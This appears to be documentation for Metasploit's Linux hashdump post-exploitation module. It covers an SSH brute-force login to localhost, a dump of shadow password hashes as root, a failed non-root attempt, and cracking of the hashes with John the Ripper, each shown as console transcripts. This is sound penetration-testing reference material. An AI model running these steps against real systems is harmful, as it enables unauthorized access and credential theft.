## Verification Steps

  1. Start msfconsole
  2. Get a session via exploit of your choice
  3. Do: `use post/linux/gather/hashdump`
  4. Do: `set session <session>`
  5. Do: `run`
  6. You should see the contents of the shadow file

## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions -l`

## Scenarios

### Obtain Hashes

  Typical run against Kali, using ssh_login for initial shell

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set username root
username => root
msf auxiliary(ssh_login) > set password "test"
password => example_password
msf auxiliary(ssh_login) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[-] SSH - Could not connect: The connection was refused by the remote host (127.0.0.1:22).
[!] No active DB -- Credential data will not be saved!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[+] SSH - Success: 'root:test' 'uid=0(root) gid=0(root) groups=0(root) Linux k 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux '
[!] No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (127.0.0.1:41521 -> 127.0.0.1:22) at 2016-09-14 00:12:36 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > use post/linux/gather/hashdump 
msf post(hashdump) > set session 1
session => 1
msf post(hashdump) > exploit

[+] root:$6$eMImGFXb$3eYV4g315Qf2NA1aQ72yMwnM68PapXfCoP74kAb5vmQoqOz7sDTJQEMPUNNjZSEz.E4tXebqvt2iR3W50L8NX.:0:0:root:/root:/bin/bash
[+] test:$6$gsSmzVTM$vxnEAvs2jEhuFtq0yzgCm.p49RmirvyI6HvPXgbLZCtg1sLp5Q2U82U6Gv6i5hz/pcsz882rnLRAyIL24h3/N.:1000:1000:test,,,:/home/test:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20160914003144_default_127.0.0.1_linux.hashes_080983.txt
[*] Post module execution completed
  ```

  This module only works when you are root or have root permisions.  If you only have user permission, expect feedback:

  ```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set username test
username => test
msf auxiliary(ssh_login) > set password test
password => test
msf auxiliary(ssh_login) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[+] SSH - Success: 'test:test' 'uid=1000(test) gid=1000(test) groups=1000(test) Linux k 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux '
[!] No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (127.0.0.1:44823 -> 127.0.0.1:22) at 2016-09-14 00:24:17 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > use post/linux/gather/hashdump
msf post(hashdump) > set session 1
session => 1
msf post(hashdump) > exploit

[-] You must run this module as root!
[*] Post module execution completed
  ```
  ### Crack Hashes (John the Ripper)
  
The stored file can then have a password cracker used against it.  In this scenario, we'll use john (the ripper).
```
root@k:/git/metasploit-framework# john /root/.msf4/loot/20160914003144_default_127.0.0.1_linux.hashes_080983.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (test)
test             (root)
2g 0:00:00:00 DONE 1/3 (2016-09-14 00:32) 40.00g/s 460.0p/s 480.0c/s 480.0C/s test..oo
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```